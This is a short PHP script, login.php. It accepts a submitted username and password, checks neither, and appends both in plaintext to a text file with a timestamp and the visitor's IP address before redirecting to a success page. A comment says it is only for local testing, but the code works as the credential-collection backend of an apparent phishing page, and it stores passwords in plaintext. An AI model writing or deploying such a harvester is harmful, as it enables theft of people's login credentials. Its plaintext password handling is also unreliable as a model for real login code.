<?php
// login.php
// Receives POST 'username' and 'passwd' and appends to data/data.txt (plaintext).
// WARNING: Storing plaintext passwords is insecure. Use only for local testing.

// Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo "Method Not Allowed";
    exit;
}

// Get inputs
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['passwd']) ? trim($_POST['passwd']) : '';

// Basic validation
if ($username === '' || $password === '') {
    // redirect back with error
    header('Location: index.html?error=empty');
    exit;
}

// Prepare directory and file paths (relative to this PHP file)
$dir = __DIR__ . '/data';
$file = $dir . '/data.txt';

// Ensure directory exists
if (!is_dir($dir)) {
    if (!mkdir($dir, 0755, true) && !is_dir($dir)) {
        // Directory creation failed
        header('Location: index.html?error=perm');
        exit;
    }
}

// Sanitize newline characters in username/password to avoid breaking file format
$username_safe = str_replace(array("\r","\n"), ' ', $username);
$password_safe = str_replace(array("\r","\n"), ' ', $password);

// Prepare the entry: timestamp, remote IP, username, password (plaintext)
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Format: [timestamp] ip<TAB>username<TAB>password\n
$entry = sprintf("[%s] %s\t%s\t%s\n", $time, $ip, $username_safe, $password_safe);

// Append with exclusive lock
$result = @file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

if ($result === false) {
    // failed to write (likely permission issue)
    header('Location: index.html?error=perm');
    exit;
}

// Try to set restrictive permissions on the file (best-effort)
@chmod($file, 0600);

// Success -> redirect back
header('Location: index.html?success=1');
exit;
?>
